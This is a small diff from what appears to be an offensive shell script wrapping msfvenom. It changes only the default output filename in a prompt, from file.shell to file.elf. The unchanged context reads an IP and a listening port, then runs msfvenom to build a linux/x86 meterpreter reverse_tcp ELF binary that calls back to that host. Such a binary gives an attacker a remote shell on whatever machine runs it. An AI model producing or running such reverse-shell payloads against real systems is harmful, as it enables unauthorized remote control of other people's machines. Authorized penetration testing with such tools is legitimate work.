@@ -39,7 +39,7 @@ echo "Binary Payload
 "
 read -p "Input Your IP~: " ip
 read -p "Port to listen(default=4444)~: " port
-read -p "Output file-name(file.shell)~: " output
+read -p "Output file-name(file.elf)~: " output
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f elf > $output
 if [ -f "$output" ] 
 then
